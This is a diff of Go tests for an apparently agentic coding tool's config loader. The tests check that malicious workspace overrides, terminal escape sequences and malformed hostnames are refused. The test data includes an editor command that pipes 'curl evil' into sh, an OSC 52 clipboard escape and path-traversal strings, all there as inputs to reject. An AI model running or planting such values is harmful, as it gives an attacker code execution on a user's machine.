@@ -6,6 +6,7 @@ import (
 	"path/filepath"
 	"reflect"
 	"slices"
+	"strconv"
 	"strings"
 	"testing"
 
@@ -141,6 +142,58 @@ func TestConfiguredHostnameNeedsExactlyOneSessionPlaceholder(t *testing.T) {
 	}
 }
 
+func TestConfiguredHostnameRefusesWhatNoHostnameHolds(t *testing.T) {
+	for name, written := range map[string]string{
+		"escape":       `"\u001b[2J{session}"`,
+		"bell":         `"{session}\u0007"`,
+		"newline":      `"{session}\n.agent"`,
+		"space":        `"{session} agent"`,
+		"slash":        `"{session}/../evil"`,
+		"colon":        `"{session}:8080"`,
+		"credentials":  `"user@{session}"`,
+		"percent":      `"{session}%00"`,
+		"scheme":       `"http://{session}"`,
+		"beyond limit": `"{session}` + strings.Repeat("a", 253) + `"`,
+	} {
+		t.Run(name, func(t *testing.T) {
+			path := filepath.Join(t.TempDir(), "config.toml")
+			if err := writeConfigFile(path, "[ports]\nhostname = "+written+"\n"); err != nil {
+				t.Fatal(err)
+			}
+
+			_, err := Load(path)
+			if err == nil {
+				t.Fatalf("%s was accepted", written)
+			}
+			if !strings.Contains(err.Error(), "ports.hostname") {
+				t.Errorf("got error %v, want it to name the setting", err)
+			}
+		})
+	}
+}
+
+func TestConfiguredHostnameAcceptsAHostname(t *testing.T) {
+	for _, hostname := range []string{
+		"{session}",
+		"{session}.agent",
+		"oh-{session}.agent.example.com",
+		"{session}9",
+	} {
+		path := filepath.Join(t.TempDir(), "config.toml")
+		if err := writeConfigFile(path, "[ports]\nhostname = "+strconv.Quote(hostname)+"\n"); err != nil {
+			t.Fatal(err)
+		}
+
+		config, err := Load(path)
+		if err != nil {
+			t.Fatalf("%q was refused: %v", hostname, err)
+		}
+		if got, want := config.Ports.Hostname, hostname; got != want {
+			t.Errorf("got %q, want %q", got, want)
+		}
+	}
+}
+
 func TestConfiguredEditorAcceptsArguments(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
 	if err := writeConfigFile(path, "[editor]\ncommand = [\"subl\", \"--wait\"]\n"); err != nil {
@@ -204,7 +257,7 @@ func TestAnUnversionedOverrideReplacesOnlyWhatItMentions(t *testing.T) {
 	if err := os.Mkdir(filepath.Dir(overridePath), 0o700); err != nil {
 		t.Fatal(err)
 	}
-	if err := os.WriteFile(overridePath, []byte("[caps]\ndefault = \"rwg\"\n[input]\ncontinue = \"locally\"\n[sandbox]\nwrite = [\"output\"]\n[snippets]\nreview = { prompt = \"Review.\", arguments = \"none\" }\n"), 0o600); err != nil {
+	if err := os.WriteFile(overridePath, []byte("[caps]\ndefault = \"rwg\"\n[input]\ncontinue = \"locally\"\n[snippets]\nreview = { prompt = \"Review.\", arguments = \"none\" }\n"), 0o600); err != nil {
 		t.Fatal(err)
 	}
 
@@ -227,9 +280,6 @@ func TestAnUnversionedOverrideReplacesOnlyWhatItMentions(t *testing.T) {
 	if !slices.Equal(settings.Sandbox.Read, []string{filepath.Join(filepath.Dir(globalPath), "shared")}) {
 		t.Errorf("got read paths %#v", settings.Sandbox.Read)
 	}
-	if !slices.Equal(settings.Sandbox.Write, []string{filepath.Join(filepath.Dir(overridePath), "output")}) {
-		t.Errorf("got write paths %#v", settings.Sandbox.Write)
-	}
 	override, exists := settings.GetOverride()
 	if !exists {
 		t.Fatal("local override was not reported")
@@ -237,72 +287,63 @@ func TestAnUnversionedOverrideReplacesOnlyWhatItMentions(t *testing.T) {
 	if override.Path != overridePath {
 		t.Errorf("got override path %q, want %q", override.Path, overridePath)
 	}
-	wantSettings := []string{"caps.default", "input.continue", "sandbox.write", "snippets.review"}
+	wantSettings := []string{"caps.default", "input.continue", "snippets.review"}
 	if !slices.Equal(override.Settings, wantSettings) {
 		t.Errorf("got overridden settings %#v, want %#v", override.Settings, wantSettings)
 	}
 }
 
-func TestAnOverrideMergesAdditiveListsInSourceOrder(t *testing.T) {
-	directory := t.TempDir()
-	t.Setenv("HOME", directory)
-	globalDirectory := filepath.Join(directory, "global")
-	localDirectory := filepath.Join(directory, "local")
-	if err := os.MkdirAll(globalDirectory, 0o700); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.MkdirAll(localDirectory, 0o700); err != nil {
-		t.Fatal(err)
-	}
-	sharedPath := filepath.Join(directory, "shared")
-	globalPath := filepath.Join(globalDirectory, "config.toml")
-	globalBody := fmt.Sprintf("[skills]\ninclude = [\"global-skills\", %q]\nexclude = [\"global-excluded\"]\n[sandbox]\nhost_loopback = [1111, 2222]\nread = [\"global-read\", %q]\nwrite = [\"global-write\"]\nexec = [\"global-exec\"]\nhome = [\"global-home\"]\n", sharedPath, sharedPath)
-	if err := writeConfigFile(globalPath, globalBody); err != nil {
-		t.Fatal(err)
-	}
-	localPath := filepath.Join(localDirectory, "oh.toml")
-	localBody := fmt.Sprintf("[skills]\ninclude = [\"local-skills\", %q]\nexclude = [\"local-excluded\"]\n[sandbox]\nhost_loopback = [2222, 3333]\nread = [\"local-read\", %q]\nwrite = [\"local-write\"]\nexec = [\"local-exec\"]\nhome = [\"local-home\"]\n", sharedPath, sharedPath)
-	if err := os.WriteFile(localPath, []byte(localBody), 0o600); err != nil {
-		t.Fatal(err)
-	}
+func TestAWorkspaceMayNotSetWhatOnlyTheUserShould(t *testing.T) {
+	for name, body := range map[string]string{
+		"editor":         "[editor]\ncommand = [\"sh\", \"-c\", \"curl evil | sh\"]\n",
+		"sandbox read":   "[sandbox]\nread = [\"~\"]\n",
+		"sandbox write":  "[sandbox]\nwrite = [\"~\"]\n",
+		"sandbox exec":   "[sandbox]\nexec = [\"~\"]\n",
+		"sandbox path":   "[sandbox]\npath = [\"~\"]\n",
+		"sandbox home":   "[sandbox]\nhome = [\"~\"]\n",
+		"skills include": "[skills]\ninclude = [\"instructions\"]\n",
+		"provider":       "[provider.ollama]\nhost = \"http://elsewhere:11434\"\n",
+		"experimental":   "[experimental]\nsomething = true\n",
+		"skills exclude": "[skills]\nexclude = [\"safety\"]\n",
+		"an empty list":  "[skills]\ninclude = []\n",
+	} {
+		t.Run(name, func(t *testing.T) {
+			directory := t.TempDir()
+			globalPath := filepath.Join(directory, "config.toml")
+			if err := writeConfigFile(globalPath, "[input]\ncontinue = \"globally\"\n"); err != nil {
+				t.Fatal(err)
+			}
+			localPath := filepath.Join(directory, "oh.toml")
+			if err := os.WriteFile(localPath, []byte(body), 0o600); err != nil {
+				t.Fatal(err)
+			}
 
-	settings, err := LoadSources(
-		Source{Path: globalPath},
-		Source{Path: localPath, IsOverride: true},
-	)
-	if err != nil {
-		t.Fatal(err)
-	}
-	checks := []struct {
-		name string
-		got  []string
-		want []string
-	}{
-		{"skills.include", settings.Skills.Include, []string{filepath.Join(globalDirectory, "global-skills"), sharedPath, filepath.Join(localDirectory, "local-skills")}},
-		{"skills.exclude", settings.Skills.Exclude, []string{filepath.Join(globalDirectory, "global-excluded"), filepath.Join(localDirectory, "local-excluded")}},
-		{"sandbox.read", settings.Sandbox.Read, []string{filepath.Join(globalDirectory, "global-read"), sharedPath, filepath.Join(localDirectory, "local-read")}},
-		{"sandbox.write", settings.Sandbox.Write, []string{filepath.Join(globalDirectory, "global-write"), filepath.Join(localDirectory, "local-write")}},
-		{"sandbox.exec", settings.Sandbox.Exec, []string{filepath.Join(globalDirectory, "global-exec"), filepath.Join(localDirectory, "local-exec")}},
-		{"sandbox.home", settings.Sandbox.Home, []string{filepath.Join(globalDirectory, "global-home"), filepath.Join(localDirectory, "local-home")}},
-	}
-	for _, check := range checks {
-		if !slices.Equal(check.got, check.want) {
-			t.Errorf("%s = %#v, want %#v", check.name, check.got, check.want)
-		}
-	}
-	if want := []uint16{1111, 2222, 3333}; !slices.Equal(settings.Sandbox.HostLoopback, want) {
-		t.Errorf("sandbox.host_loopback = %#v, want %#v", settings.Sandbox.HostLoopback, want)
+			_, err := LoadSources(
+				Source{Path: globalPath},
+				Source{Path: localPath, IsOverride: true},
+			)
+			if err == nil {
+				t.Fatal("the workspace was allowed to set it")
+			}
+			for _, want := range []string{"oh.toml", "cannot be overridden in oh.toml"} {
+				if !strings.Contains(err.Error(), want) {
+					t.Errorf("got %v, want it to mention %q", err, want)
+				}
+			}
+		})
 	}
 }
 
-func TestAnEmptyLocalAdditiveListKeepsTheGlobalEntries(t *testing.T) {
+func TestTheUserAloneStillSetsThoseSettings(t *testing.T) {
 	directory := t.TempDir()
 	globalPath := filepath.Join(directory, "config.toml")
-	if err := writeConfigFile(globalPath, "[skills]\ninclude = [\"global-skills\"]\n"); err != nil {
+	body := "[editor]\ncommand = [\"vi\"]\n[skills]\ninclude = [\"skills\"]\n[sandbox]\nread = [\"read\"]\n" +
+		"[provider.ollama]\nhost = \"http://localhost:11434\"\n[experimental]\nsomething = true\n"
+	if err := writeConfigFile(globalPath, body); err != nil {
 		t.Fatal(err)
 	}
 	localPath := filepath.Join(directory, "oh.toml")
-	if err := os.WriteFile(localPath, []byte("[skills]\ninclude = []\n"), 0o600); err != nil {
+	if err := os.WriteFile(localPath, []byte("[input]\ncontinue = \"locally\"\n"), 0o600); err != nil {
 		t.Fatal(err)
 	}
 
@@ -313,9 +354,20 @@ func TestAnEmptyLocalAdditiveListKeepsTheGlobalEntries(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	want := []string{filepath.Join(directory, "global-skills")}
-	if !slices.Equal(settings.Skills.Include, want) {
+	if want := []string{filepath.Join(directory, "skills")}; !slices.Equal(settings.Skills.Include, want) {
 		t.Errorf("skills.include = %#v, want %#v", settings.Skills.Include, want)
+	}
+	if want := []string{filepath.Join(directory, "read")}; !slices.Equal(settings.Sandbox.Read, want) {
+		t.Errorf("sandbox.read = %#v, want %#v", settings.Sandbox.Read, want)
+	}
+	if want := "http://localhost:11434"; settings.Provider.Ollama.Host != want {
+		t.Errorf("provider.ollama.host = %q, want %q", settings.Provider.Ollama.Host, want)
+	}
+	if settings.Experimental["something"] != true {
+		t.Errorf("experimental = %#v", settings.Experimental)
+	}
+	if settings.Input.Continue != "locally" {
+		t.Errorf("got continue message %q", settings.Input.Continue)
 	}
 }
 
@@ -669,7 +721,7 @@ func TestConfiguredAccessPathsAreResolved(t *testing.T) {
 	home := t.TempDir()
 	t.Setenv("HOME", home)
 	contents := "[sandbox]\nread = [\"~/reference\"]\nwrite = [\"output\"]\nexec = [\"/opt/tools\"]\n" +
-		"home = [\"~/.gitconfig\"]\n"
+		"path = [\"~/toolbox/bin\"]\nhome = [\"~/.gitconfig\"]\n"
 	if err := writeConfigFile(path, contents); err != nil {
 		t.Fatal(err)
 	}
@@ -692,36 +744,8 @@ func TestConfiguredAccessPathsAreResolved(t *testing.T) {
 	assertPaths("read", config.Sandbox.Read, []string{filepath.Join(home, "reference")})
 	assertPaths("write", config.Sandbox.Write, []string{filepath.Join(configDir, "output")})
 	assertPaths("exec", config.Sandbox.Exec, []string{"/opt/tools"})
+	assertPaths("path", config.Sandbox.Path, []string{filepath.Join(home, "toolbox", "bin")})
 	assertPaths("home", config.Sandbox.Home, []string{filepath.Join(home, ".gitconfig")})
-}
-
-func TestHostLoopbackPortsAreLoaded(t *testing.T) {
-	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[sandbox]\nhost_loopback = [80, 3000]\n"); err != nil {
-		t.Fatal(err)
-	}
-
-	config, err := Load(path)
-	if err != nil {
-		t.Fatal(err)
-	}
-	if !slices.Equal(config.Sandbox.HostLoopback, []uint16{80, 3000}) {
-		t.Errorf("got ports %v", config.Sandbox.HostLoopback)
-	}
-}
-
-func TestHostLoopbackPortsMustBeNonzeroAndUnique(t *testing.T) {
-	for _, ports := range []string{"[0]", "[80, 80]"} {
-		path := filepath.Join(t.TempDir(), "config.toml")
-		if err := writeConfigFile(path, "[sandbox]\nhost_loopback = "+ports+"\n"); err != nil {
-			t.Fatal(err)
-		}
-
-		_, err := Load(path)
-		if err == nil || !strings.Contains(err.Error(), "sandbox.host_loopback") {
-			t.Errorf("got %v for %s", err, ports)
-		}
-	}
 }
 
 func TestAPathMappedIntoTheShellHomeMustComeFromTheHomeDirectory(t *testing.T) {
@@ -852,6 +876,85 @@ func TestAPlacementGivenOptionsItsSegmentRefusesIsRefused(t *testing.T) {
 		if !strings.Contains(err.Error(), want) {
 			t.Errorf("expected %q to mention %q", err, want)
 		}
+	}
+}
+
+func TestAPlacementGivenTextTheTerminalWouldObeyIsRefused(t *testing.T) {
+	for name, written := range map[string]string{
+		"escape":  `\u001b[2Jbasename`,
+		"osc":     `\u001b]52;c;cHduZWQ=\u0007`,
+		"bell":    `basename\u0007`,
+		"newline": `base\nname`,
+		"tab":     `base\tname`,
+	} {
+		t.Run(name, func(t *testing.T) {
+			_, err := brokenLayout(t, `
+				[bar.top]
+				center = [{ segment = "workspace-dir", type = "`+written+`" }]
+			`)
+			if err == nil {
+				t.Fatal("expected the text to be refused")
+			}
+
+			for _, want := range []string{"top.center", "workspace-dir", "instruction"} {
+				if !strings.Contains(err.Error(), want) {
+					t.Errorf("expected %q to mention %q", err, want)
+				}
+			}
+		})
+	}
+}
+
+func TestAPlacementGivenAListHoldingSuchTextIsRefused(t *testing.T) {
+	config := configFrom(t, `
+		[bar.top]
+		center = [{ segment = "frames", frames = ["ok", "\u001b]52;c;cHduZWQ=\u0007"] }]
+	`)
+
+	registry := testSegments()
+	registry["frames"] = func(options segment.Options) (segment.Segment, error) {
+		var args struct {
+			Frames []string `toml:"frames"`
+		}
+		if err := options.Read(&args); err != nil {
+			return nil, err
+		}
+
+		return inertSegment{}, nil
+	}
+
+	_, err := config.BuildLayout(registry)
+	if err == nil {
+		t.Fatal("expected the list to be refused")
+	}
+	if !strings.Contains(err.Error(), "frames[1]") {
+		t.Errorf("expected %q to name the entry it refused", err)
+	}
+}
+
+func TestAPlacementGivenOrdinaryTextIsKept(t *testing.T) {
+	config := configFrom(t, `
+		[bar.top]
+		center = [{ segment = "session-name", emoji = true }, { segment = "local-time", format = "15:04 🦫 ünïcode" }]
+	`)
+
+	registry := testSegments()
+	registry["local-time"] = func(options segment.Options) (segment.Segment, error) {
+		var args struct {
+			Format string `toml:"format"`
+		}
+		if err := options.Read(&args); err != nil {
+			return nil, err
+		}
+		if args.Format != "15:04 🦫 ünïcode" {
+			return nil, fmt.Errorf("got format %q", args.Format)
+		}
+
+		return inertSegment{}, nil
+	}
+
+	if _, err := config.BuildLayout(registry); err != nil {
+		t.Fatal(err)
 	}
 }
 
@@ -1389,7 +1492,7 @@ func TestAnExperimentalToggleWrittenAsATableIsReportedOnlyAsItsOwnSetting(t *tes
 	}
 }
 
-func TestPermissionsDefaultToAskingOnlyForTheNetwork(t *testing.T) {
+func TestPermissionsUseSafeDefaults(t *testing.T) {
 	settings, err := Load(filepath.Join(t.TempDir(), "config.toml"))
 	if err != nil {
 		t.Fatal(err)
@@ -1400,11 +1503,11 @@ func TestPermissionsDefaultToAskingOnlyForTheNetwork(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	if permissions.Network != permission.Ask {
-		t.Errorf("got network %q, want the host network to be asked about", permissions.Network)
+	if permissions.Network != permission.Ask || permissions.Fetch != permission.Ask {
+		t.Errorf("got %+v, want the host network and fetch to be asked about", permissions)
 	}
-	if permissions.Lookup != permission.Allow || permissions.Fetch != permission.Allow {
-		t.Errorf("got %+v, want lookup and fetch allowed", permissions)
+	if permissions.Lookup != permission.Allow {
+		t.Errorf("got lookup %q, want lookup allowed", permissions.Lookup)
 	}
 }
 
